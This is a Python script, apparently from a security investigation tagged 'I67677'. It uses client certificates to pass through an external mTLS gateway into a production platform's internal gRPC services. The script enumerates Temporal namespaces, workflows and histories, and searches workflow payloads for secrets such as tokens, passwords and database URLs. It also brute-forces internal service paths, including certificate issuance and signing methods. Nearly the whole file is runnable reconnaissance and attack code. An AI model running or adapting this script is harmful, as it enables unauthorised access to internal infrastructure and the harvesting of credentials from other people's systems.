#!/usr/bin/env python3
# I67677: read-only Temporal plane over external mpipe gateway + path-family mapping
import subprocess, struct, json, sys, os, time, re

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
MARK = os.environ.get('MARK', 'I67677')
CTR = [0]


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def printable(b):
    try:
        s = b.decode('utf-8')
    except Exception:
        return False
    return all((31 < ord(c) < 127) or c in '\n\t\r' for c in s)


def dump(b, depth=0, maxd=7):
    try:
        fields = parse(b)
    except Exception:
        return None
    if not fields:
        return None
    parts = []
    for f, w, v in fields:
        if w == 0:
            parts.append('%d=%d' % (f, v))
        elif w == 2:
            nested = None
            if depth < maxd and 0 < len(v) <= 2048:
                nested = dump(v, depth + 1, maxd)
            if nested is not None and not printable(v):
                parts.append('%d{%s}' % (f, nested))
            elif printable(v) and len(v) > 0:
                s = v.decode('utf-8').replace('\n', '\\n')
                parts.append('%d="%s"' % (f, s[:140]))
            else:
                parts.append('%d=hex(%s,len%d)' % (f, v[:8].hex(), len(v)))
        else:
            parts.append('%d=w%d(%s)' % (f, w, v.hex()))
    return ' '.join(parts)


def grpc_call(path, body=b'', timeout=12, target=None, method='POST'):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    tu = '/tmp/t%d.txt' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '4', '-m', str(timeout), '-D', hu, '-o', bu,
            '--trace-ascii', tu, '-w', '%{http_code}',
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', method, G + path,
            '-H', 'te: trailers']
    if method == 'POST':
        args += ['-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    if target:
        args += ['-H', 'x-mpipe-target: ' + target]
    t0 = time.time()
    p = subprocess.run(args, capture_output=True, text=True)
    dt = time.time() - t0
    hdr = ''
    for f in (hu, tu):
        try:
            hdr += open(f, 'rb').read().decode('utf-8', 'replace')
        except Exception:
            pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'http': p.stdout.strip(), 'st': (sts[-1] if sts else '-'),
            'msg': (msgs[-1].strip()[:120] if msgs else ''), 'n': len(data),
            'data': data, 'dt': round(dt, 2), 'err': (p.stderr or '').strip()[:100],
            'hdrlen': len(hdr)}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def show(tag, r, body=True, lim=520):
    s = '%s|http=%s|st=%s' % (tag, r['http'], r['st'])
    if r['msg']:
        s += '|m=' + r['msg']
    s += '|len=%d|t=%s' % (r['n'], r['dt'])
    if r['err']:
        s += '|E=' + r['err']
    print(s, flush=True)
    if body and r['data']:
        pl = frame_payload(r['data'])
        d = dump(pl)
        if d:
            print('   B: ' + d[:lim], flush=True)
        else:
            print('   H: ' + pl[:120].hex(), flush=True)
        strs = [x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{4,}', pl)]
        if strs:
            print('   S: ' + ' | '.join(strs)[:lim], flush=True)
    return r


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


print('===I67677 PROBE START %s=== %s' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
print('hostname=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(), flush=True)
print('cert:', flush=True)
print(subprocess.run(['sh', '-c', 'openssl x509 -in %s -noout -subject -issuer 2>&1 | tr "\\n" " "' % CRT],
                     capture_output=True, text=True).stdout.strip(), flush=True)

T = '/temporal.api.workflowservice.v1.WorkflowService/'

print('===A CONTROLS===', flush=True)
try:
    show('OTLP_EXPORT', grpc_call('/opentelemetry.proto.collector.trace.v1.TraceService/Export', b'', target='internal_traces'))
except Exception as e:
    print('OTLP_ERR', repr(e), flush=True)
show('GETROOT', grpc_call('/', b'', method='GET'))
show('T_GetSystemInfo', grpc_call(T + 'GetSystemInfo', b''))
show('T_GetSystemInfo_HDR', grpc_call(T + 'GetSystemInfo', b'', target='internal_temporal'))

print('===B CLUSTER===', flush=True)
show('T_GetClusterInfo', grpc_call(T + 'GetClusterInfo', b''))
show('T_GetSearchAttributes', grpc_call(T + 'GetSearchAttributes', b''))
rl = show('T_ListNamespaces', grpc_call(T + 'ListNamespaces', fv(1, 20)))
names = []
if rl['data']:
    pl = frame_payload(rl['data'])
    for nresp in all_of(pl, 1):
        ni = get1(nresp, 1) or b''
        nm = get1(ni, 1)
        if nm:
            try:
                names.append(nm.decode())
            except Exception:
                pass
print('NS_FOUND=' + ','.join(names[:20]), flush=True)
cand = []
for n in names + ['default', 'production', 'railway', 'railway-production', 'prod']:
    if n and n not in cand:
        cand.append(n)
for ns in cand[:8]:
    show('T_DescribeNamespace[%s]' % ns, grpc_call(T + 'DescribeNamespace', fs(1, ns)))

print('===C LIST WORKFLOWS===', flush=True)
execs = []  # (ns, wid, rid, wtype, dump)
for ns in (cand[:4] or ['default']):
    for q in ['ExecutionTime > "2026-10-19T13:00:00Z"', '']:
        req = fs(1, ns) + fv(2, 5) + (fs(4, q) if q else b'')
        r = grpc_call(T + 'ListWorkflowExecutions', req, timeout=20)
        show('T_ListWE[%s][%s]' % (ns, q[:12]), r, lim=900)
        if r['data']:
            pl = frame_payload(r['data'])
            for ei in all_of(pl, 1)[:5]:
                ex = get1(ei, 1) or b''
                wid = get1(ex, 1)
                rid = get1(ex, 2) or b''
                ty = get1(get1(ei, 2) or b'', 1)
                try:
                    wid = wid.decode() if wid else ''
                except Exception:
                    wid = ''
                try:
                    rid = rid.decode() if rid else ''
                except Exception:
                    rid = ''
                try:
                    ty = ty.decode() if ty else ''
                except Exception:
                    ty = ''
                if wid:
                    execs.append((ns, wid, rid, ty))
        if r['st'] not in ('0',):
            break

# task queue probes
print('===C2 TASK QUEUES===', flush=True)
for ns in (cand[:3] or ['default']):
    for tq in ['builder', 'production-builderv3', 'builder/us-west1', 'production-builderv3-us-west1']:
        req = fs(1, ns) + fmsg(2, fs(1, tq)) + fv(3, 1) + fv(4, 1)
        r = grpc_call(T + 'DescribeTaskQueue', req, timeout=15)
        show('T_DescribeTQ[%s][%s]' % (ns, tq), r, lim=300)
        if r['st'] == '0':
            break

print('===D HISTORY===', flush=True)
sel = [e for e in execs if re.search(r'(?i)build|deploy|orchestr|stack|release', e[3])][:3]
if not sel:
    sel = execs[:2]
for ns, wid, rid, ty in sel:
    req = fs(1, ns) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20)
    r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=25)
    show('T_GetWEHistory[%s][%s][%s]' % (ns, ty[:24], wid[:40]), r, lim=700)
    if r['data']:
        pl = frame_payload(r['data'])
        # history.events field 1; each event: field 3 = event_type, field 6 = started attrs
        evs = all_of(pl, 1)
        print('   EVENTS=%d' % len(evs), flush=True)
        for ev in evs[:6]:
            et = [v for f, w, v in parse(ev) if f == 3 and w == 0]
            sa = get1(ev, 6)
            if sa:
                tq = get1(sa, 5)
                inp = get1(sa, 6)
                tqn = ''
                if tq:
                    tqn = (get1(tq, 1) or b'').decode('utf-8', 'replace')
                print('   EV type=%s tq=%s' % (et, tqn), flush=True)
                if inp:
                    for p in all_of(inp, 1):
                        meta = get1(p, 1)
                        data = get1(p, 2)
                        print('     PAY meta_len=%s data_len=%s' % (len(meta or b''), len(data or b'')), flush=True)
                        if data:
                            txt = data.decode('utf-8', 'replace')
                            keys = []
                            try:
                                j = json.loads(txt)
                                if isinstance(j, dict):
                                    keys = list(j.keys())[:40]
                            except Exception:
                                keys = re.findall(r'"([A-Za-z0-9_\-\.]{2,48})"\s*:', txt)[:40]
                            print('     KEYS=' + ','.join(keys), flush=True)
                            low = txt.lower()
                            hit = [k for k in ['token', 'secret', 'password', 'passwd', 'dsn', 'connectionstring',
                                               'apikey', 'api_key', 'private', 'credential', 'access_key',
                                               'database_url', 'redis_url'] if k in low]
                            if hit:
                                print('     SENSITIVE_KEYWORDS=' + ','.join(hit), flush=True)

print('===E PATH MAP===', flush=True)
paths = []
for svc, ms in [
    ('stacklet.Stacklet', ['Health', 'ListCerts', 'Get', 'IssueCert', 'Sign', 'List']),
    ('certs.Certs', ['Health', 'List', 'Get', 'Issue', 'Sign']),
    ('pki.PKI', ['Health', 'List', 'Get', 'Issue', 'Sign']),
    ('network_cp.EndpointSpecService', ['List', 'Get', 'Health']),
    ('network_cp.NetworkCPService', ['List', 'Get', 'Health']),
    ('network_cp.EndpointSpec', ['List', 'Get', 'Health']),
    ('stats.StatsService', ['List', 'Get', 'Health']),
    ('stats.Stats', ['List', 'Get', 'Health']),
    ('vm_runner.RunnerApiService', ['List', 'Get', 'Health']),
    ('vm_runner.RunnerApi', ['List', 'Get', 'Health']),
    ('builderv3.BuilderService', ['Health', 'List', 'Get']),
    ('builderv3.Builder', ['Health', 'List', 'Get']),
]:
    for m in ms:
        paths.append('/%s/%s' % (svc, m))
mapped = []
for p in paths:
    r = grpc_call(p, b'', timeout=5)
    print('P|%s|http=%s|st=%s|len=%d' % (p, r['http'], r['st'], r['n']), flush=True)
    if r['st'] not in ('12', '-'):
        mapped.append(p)
        if r['data']:
            print('   B: ' + (dump(frame_payload(r['data'])) or '')[:200], flush=True)

print('===E2 PLAIN PATHS===', flush=True)
for p in ['/mtls-service-gateway/health', '/mtls-service-gateway/status', '/health', '/status',
          '/grpc.health.v1.Health/Check']:
    r = grpc_call(p, b'', timeout=5, method=('GET' if p.count('/') <= 1 or p.startswith('/mtls-service-gateway') else 'POST'))
    print('P|%s|http=%s|st=%s|len=%d' % (p, r['http'], r['st'], r['n']), flush=True)
    if r['data']:
        print('   H: ' + r['data'][:100].decode('utf-8', 'replace').replace('\n', ' '), flush=True)

print('MAPPED=%d' % len(mapped), flush=True)
print('===I67677 PROBE END %s===' % MARK, flush=True)
